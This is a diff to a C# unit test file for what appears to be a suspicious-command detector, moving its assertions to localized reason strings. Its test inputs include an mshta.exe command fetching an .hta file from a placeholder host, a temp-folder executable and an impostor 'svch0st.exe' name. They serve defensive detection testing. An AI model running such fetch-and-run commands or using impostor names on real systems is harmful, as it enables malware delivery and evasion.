@@ -1,3 +1,4 @@
+using Vacuon.Core.Localization;
 using Vacuon.Core.Security;
 using Xunit;
 
@@ -86,7 +87,7 @@ public class CommandHeuristicsTests
             null);
 
         Assert.Equal(Suspicion.HighlySuspicious, level);
-        Assert.Contains(reasons, r => r.Contains("Base64"));
+        Assert.Contains(reasons, r => r == L.T("heuristic.encodedPowerShell"));
     }
 
     [Fact]
@@ -103,7 +104,7 @@ public class CommandHeuristicsTests
             @"mshta.exe http://exemplo.invalido/x.hta", null);
 
         Assert.Equal(Suspicion.HighlySuspicious, level);
-        Assert.Contains(reasons, r => r.Contains("mshta"));
+        Assert.Contains(reasons, r => r == L.T("heuristic.lolbin", "mshta.exe"));
     }
 
     [Fact]
@@ -114,7 +115,7 @@ public class CommandHeuristicsTests
             @"C:\Users\joao\AppData\Local\Temp\update.exe");
 
         Assert.True(level >= Suspicion.Suspicious);
-        Assert.Contains(reasons, r => r.Contains("volátil"));
+        Assert.Contains(reasons, r => r == L.T("heuristic.volatileFolder", @"appdata\local\temp"));
     }
 
     [Fact]
@@ -124,7 +125,7 @@ public class CommandHeuristicsTests
             @"C:\Users\joao\svch0st.exe", @"C:\Users\joao\svch0st.exe");
 
         Assert.Equal(Suspicion.HighlySuspicious, level);
-        Assert.Contains(reasons, r => r.Contains("imita"));
+        Assert.Contains(reasons, r => r == L.T("heuristic.impostorName", "svch0st.exe"));
     }
 
     [Fact]
